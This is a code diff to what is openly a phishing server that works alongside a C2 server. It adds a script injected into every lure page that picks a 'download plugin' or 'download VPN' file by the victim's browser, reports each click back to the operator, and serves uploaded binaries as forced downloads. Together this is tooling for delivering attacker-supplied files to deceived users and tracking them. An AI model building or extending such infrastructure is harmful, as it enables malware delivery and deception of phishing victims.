@@ -14,6 +14,7 @@ stop() 优雅关闭 —— 与 c2_server 的 PyExec2Server 模式一致。
 
 import json
 import logging
+import os
 import time
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from typing import Optional
@@ -25,6 +26,48 @@ from .module_loader import JsModuleLoader
 from .page_renderer import PageRenderer
 
 logger = logging.getLogger("phishing.server")
+
+# 下载物选择器:注入每个页面。按访客 UA 匹配 downloads.json 中同 name 的条目,
+# 动态把 <a data-download="名称"> 的 href 替换为真实地址;点击时回传所选下载物。
+# 注:注入内容本身紧凑无注释(载荷)。
+_DL_SELECTOR_JS = """(function(){
+  var DL = window.__PH_DOWNLOADS__ || [];
+  var ua = (navigator.userAgent || '').toLowerCase();
+  var is = {
+    edge:    ua.indexOf('edg') > -1,
+    firefox: ua.indexOf('firefox') > -1,
+    chrome:  ua.indexOf('chrome') > -1 && ua.indexOf('edg') < 0 && ua.indexOf('opr') < 0,
+    safari:  ua.indexOf('safari') > -1 && ua.indexOf('chrome') < 0
+  };
+  function pick(name) {
+    var cands = [];
+    for (var i = 0; i < DL.length; i++) if (DL[i].name === name) cands.push(DL[i]);
+    if (!cands.length) return '';
+    for (var k in is) if (is[k])
+      for (var j = 0; j < cands.length; j++)
+        if (cands[j].ua === k) return cands[j].path;
+    for (var m = 0; m < cands.length; m++) if (!cands[m].ua) return cands[m].path;
+    return cands[0].path;
+  }
+  function fire(el, url) {
+    var name = el.getAttribute('data-download') || '';
+    try { report({ type: 'download_click', name: name, url: url, ua: (navigator.userAgent || '') }); } catch (e) {}
+    if (!url) return;
+    if (el.tagName.toLowerCase() === 'a') { el.href = url; return; }
+    var a = document.createElement('a');
+    a.href = url;
+    a.download = url.split('/').pop() || '';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }
+  var els = document.querySelectorAll('a[data-download], button[data-download]');
+  for (var n = 0; n < els.length; n++) (function (el) {
+    var url = pick(el.getAttribute('data-download'));
+    if (el.tagName.toLowerCase() === 'a' && url) el.href = url;
+    el.addEventListener('click', function () {
+      fire(el, pick(el.getAttribute('data-download')));
+    });
+  })(els[n]);
+})();"""
 
 
 class PhishingServer:
@@ -77,6 +120,76 @@ class PhishingServer:
     def active_page(self) -> str:
         return self._pages.active_page(self._config)
 
+    def _load_downloads(self) -> list:
+        """读取下载物列表(downloads.json,与 config 同目录)。"""
+        try:
+            from .downloads import load_downloads
+            return load_downloads(self._config)
+        except Exception:
+            return []
+
+    def downloads_dir(self) -> str:
+        """共享下载文件目录(所有页面共用;不存在则创建)。"""
+        base = getattr(self._config, "base_dir", "") or "."
+        d = os.path.join(base, "downloads_files")
+        try:
+            os.makedirs(d, exist_ok=True)
+        except OSError:
+            pass
+        return d
+
+    def list_download_files(self) -> list:
+        """共享下载目录内文件列表。"""
+        d = self.downloads_dir()
+        try:
+            return sorted(f for f in os.listdir(d)
+                          if os.path.isfile(os.path.join(d, f))
+                          and not f.startswith("."))
+        except OSError:
+            return []
+
+    def write_download_file(self, filename: str, content: str) -> tuple:
+        """写入共享下载目录文件(FS3B64 前缀=二进制;白名单扩展名;防穿越)。"""
+        if not filename:
+            return False, "文件名不能为空"
+        if "/" in filename or "\\" in filename or ".." in filename:
+            return False, "文件名非法"
+        ext = os.path.splitext(filename)[1].lower()
+        from .page_renderer import _ALLOWED_EXTS
+        if ext not in _ALLOWED_EXTS:
+            return False, f"只允许: {sorted(_ALLOWED_EXTS)}"
+        d = self.downloads_dir()
+        path = os.path.join(d, filename)
+        try:
+            if isinstance(content, str) and content.startswith("FS3B64:"):
+                import base64
+                data = base64.b64decode(content[len("FS3B64:"):].strip())
+                with open(path, "wb") as f:
+                    f.write(data)
+            else:
+                with open(path, "w", encoding="utf-8") as f:
+                    f.write(str(content or ""))
+        except OSError as e:
+            return False, f"写入失败: {e}"
+        except Exception as e:
+            return False, f"写入失败: {e}"
+        return True, f"已上传到共享下载目录: {filename}"
+
+    def delete_download_file(self, filename: str) -> tuple:
+        """删除共享下载目录文件(防穿越)。"""
+        if not filename:
+            return False, "文件名不能为空"
+        if "/" in filename or "\\" in filename or ".." in filename:
+            return False, "文件名非法"
+        path = os.path.join(self.downloads_dir(), filename)
+        if not os.path.isfile(path):
+            return False, f"文件 {filename} 不存在"
+        try:
+            os.remove(path)
+        except OSError as e:
+            return False, f"删除失败: {e}"
+        return True, f"已删除 {filename}"
+
     def status(self) -> dict:
         return {
             "ok": True,
@@ -87,6 +200,7 @@ class PhishingServer:
             "page_count": len(self._pages.list_pages()),
             "active_page": self.active_page,
             "default_module": self._config.default_module,
+            "download_file": self._config.download_file,
             "route_payload": self._config.route_payload,
             "route_report": self._config.route_report,
             "config": {
@@ -96,6 +210,7 @@ class PhishingServer:
                 "route_report": self._config.route_report,
                 "default_module": self._config.default_module,
                 "active_page": self.active_page,
+                "download_file": self._config.download_file,
                 "report_max": self._config.report_max,
                 "max_payload_bytes": self._config.max_payload_bytes,
             },
@@ -171,12 +286,20 @@ def _make_handler(server: PhishingServer):
                     self._handle_report(q)
                 elif self.command == "GET" and path == "/":
                     self._handle_index()
-                elif self.command == "GET" and path.startswith("/page/"):
-                    self._handle_page(path[len("/page/"):].strip("/"))
-                elif self.command == "GET" and path.startswith("/pages/"):
-                    self._handle_page_file(path[len("/pages/"):].strip("/"))
                 elif self.command == "GET" and path == "/health":
                     self._handle_health()
+                elif self.command == "GET" and path.startswith("/pages/"):
+                    # 仅放行当前活动页面的资源(移除指定访问页面功能:选中的页面才能访问)
+                    self._handle_page_file(path[len("/pages/"):].strip("/"))
+                elif self.command == "GET" and path.startswith("/download/"):
+                    self._handle_download(path[len("/download/"):].strip("/"))
+                elif self.command == "GET" and path.startswith("/page/"):
+                    # 仅放行当前活动页面(其余 404)
+                    name = path[len("/page/"):].strip("/")
+                    if name != server.active_page:
+                        self._send_text(404, "text/plain; charset=utf-8", "not found")
+                        return
+                    self._handle_page(name)
                 else:
                     self._send_text(404, "text/plain; charset=utf-8", "not found")
             except (BrokenPipeError, ConnectionResetError):
@@ -208,7 +331,9 @@ def _make_handler(server: PhishingServer):
                     self._send_text(400, "text/plain; charset=utf-8",
                                     "参数 a 必须是 JSON 对象")
                     return
-            res = server._builder.build(name, params, host=server._host_override)
+            res = server._builder.build(name, params,
+                                        host=q.get("host") or server._host_override,
+                                        port=q.get("port") if q.get("port") else None)
             if not res.get("ok"):
                 self._send_text(400, "text/plain; charset=utf-8",
                                 res.get("error", "build failed"))
@@ -273,18 +398,84 @@ def _make_handler(server: PhishingServer):
                 self._send_text(404, "text/plain; charset=utf-8",
                                 f"page '{name}' not found")
                 return
-            self._send_bytes(200, res["mime"], res["html"].encode("utf-8"))
+            html = res["html"]
+            # 注入下载物列表 + UA 选择器(页面"下载插件/下载 VPN"按钮用)
+            dls = server._load_downloads()
+            inject = ('<script>window.__PH_DOWNLOADS__ = '
+                      f"{json.dumps(dls, ensure_ascii=False)};</script>\n"
+                      f"<script>{_DL_SELECTOR_JS}</script>")
+            if "</head>" in html:
+                html = html.replace("</head>", inject + "</head>", 1)
+            else:
+                html = inject + html
+            self._send_bytes(200, res["mime"], html.encode("utf-8"))
 
         def _handle_page_file(self, rest):
+            # 仅放行当前活动页面的资源,其余 404(移除指定访问页面功能)
             if "/" not in rest:
                 self._send_text(404, "text/plain; charset=utf-8", "not found")
                 return
             name, file = rest.split("/", 1)
+            if name != server.active_page:
+                self._send_text(404, "text/plain; charset=utf-8", "not found")
+                return
             res = server._pages.serve_file(name, file, server._config)
             if not res:
                 self._send_text(404, "text/plain; charset=utf-8", "not found")
                 return
             self._send_bytes(200, res["mime"], res["data"])
+
+        def _handle_download(self, rest):
+            """下载文件:仅当前活动页面目录内、且文件名在下载物配置(/download/ 前缀 path)中。
+
+            路径格式 /download/<file>。用于钓鱼页面"下载插件/下载 VPN"按钮,
+            支持多下载物(downloads.json 中任何 path 以 /download/ 开头的条目),
+            兼容单文件配置 download_file;防任意路径下载。
+            """
+            if "/" in rest or ".." in rest:
+                self._send_text(404, "text/plain; charset=utf-8", "not found")
+                return
+            # 收集允许下载的文件名:downloads.json 中 path 为 /download/<file> 的条目
+            allowed = set()
+            for d in server._load_downloads():
+                p = str(d.get("path") or "")
+                if p.startswith("/download/"):
+                    fname = p[len("/download/"):].strip("/")
+                    if fname and "/" not in fname and ".." not in fname:
+                        allowed.add(fname)
+            # 兼容旧配置:单文件 download_file
+            dfile = server._config.download_file or ""
+            if dfile:
+                allowed.add(dfile)
+            # 共享下载目录中的文件自动允许下载(上传即用,免手动登记)
+            for f in server.list_download_files():
+                allowed.add(f)
+            if rest not in allowed:
+                self._send_text(404, "text/plain; charset=utf-8", "not found")
+                return
+            # 文件位于共享下载目录 downloads_files/(所有页面共用,不依赖 active_page)
+            dfile = rest
+            path = os.path.join(server.downloads_dir(), dfile)
+            if not os.path.isfile(path):
+                self._send_text(404, "text/plain; charset=utf-8", "not found")
+                return
+            try:
+                with open(path, "rb") as f:
+                    data = f.read()
+            except OSError:
+                self._send_text(404, "text/plain; charset=utf-8", "not found")
+                return
+            # 二进制下载:Content-Disposition attachment,浏览器触发下载
+            self.send_response(200)
+            self.send_header("Content-Type", "application/octet-stream")
+            self.send_header("Content-Length", str(len(data)))
+            self.send_header("Content-Disposition",
+                             f'attachment; filename="{dfile}"')
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.end_headers()
+            if self.command != "HEAD":
+                self.wfile.write(data)
 
         # ── 健康检查 ──
 
